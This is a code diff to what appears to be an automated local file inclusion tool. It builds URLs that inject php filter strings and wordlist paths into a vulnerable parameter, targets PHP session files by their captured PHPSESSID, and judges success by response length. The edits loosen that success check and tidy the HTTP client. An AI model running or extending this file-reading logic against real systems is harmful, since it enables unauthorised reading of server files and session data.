@@ -91,7 +91,9 @@ class Read_File:
                request = mechanize.Browser()
                request.set_handle_robots(False)
                request.set_handle_redirect(True)
-               request.set_handle_refresh(True, max_time=1)
+               request.set_handle_refresh(True, max_time=1)    
+               request.set_handle_equiv(False)
+               request.set_handle_gzip(False)
                request.addheaders = [
                                 ("User-Agent", "curl/7.88.1"),
                                 ("Accept", "*/*"),
@@ -174,7 +176,6 @@ class Read_File:
                             URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
                         else:
                             URL= self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE.replace('\n','')+self.args.read.split("_")[0]+"_"+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))  
-                            print(URL)
                     elif "sess_" in self.args.read: 
                         URL = self.args.Vulnurl+LINE.replace('\n','')+self.args.read.split("_")[0]+"_"+str("".join(re.findall(r"PHPSESSID=([a-z0-9]+)",self.Cookie)))         
                     else:    
@@ -191,12 +192,13 @@ class Read_File:
                     if "sess_" in self.args.read:
                         self.url = URL  
                     else:                                                                                                    
-                        self.url = self.LFI
-                    print(self.url)    
+                        self.url = self.LFI   
                     request = mechanize.Browser()
                     request.set_handle_robots(False)
                     request.set_handle_redirect(True)
-                    request.set_handle_refresh(True, max_time=1)              
+                    request.set_handle_refresh(True, max_time=1)    
+                    request.set_handle_equiv(False)
+                    request.set_handle_gzip(False)
                     request.addheaders = [
                                 ("User-Agent", "curl/7.88.1"),
                                 ("Accept", "*/*"),
@@ -208,10 +210,11 @@ class Read_File:
                     try:
                         try:
                             self._first_req = request.open(self.args.Vulnurl, timeout=5).read()
+                      
                         except Exception:
                             self._first_req = b''
                         self.Get_Oregnal_URL = request.open(self.url, timeout=5).read()
-                   
+
                     except KeyboardInterrupt:
                         print("\n[!] Scan stopped by user")
                         return 
@@ -219,8 +222,7 @@ class Read_File:
                         continue
                     except KeyboardInterrupt:
                          exit()           
-                 
-                    if self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) :                  
+                    if self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) or self.args.auth and len(self.Get_Oregnal_URL) > 200  :                  
                         pythex = str(re.findall('Content-Length:.+',str(self.info)))
                         pythex= pythex.replace("['",'').replace("']",'')
                         if pythex in str(self.info):
@@ -300,7 +302,7 @@ class Read_File:
                                 exit()             
                            else:
                                 exit()     
-                    elif not self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req):
+                    elif not self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) or len(self.Get_Oregnal_URL) > 200 :
                            Read_File.file_name (self,**kwargs)
                            from Package.FileStore import FileManager
                            FileManager.FileRStore_Write(self,args=self.control) 
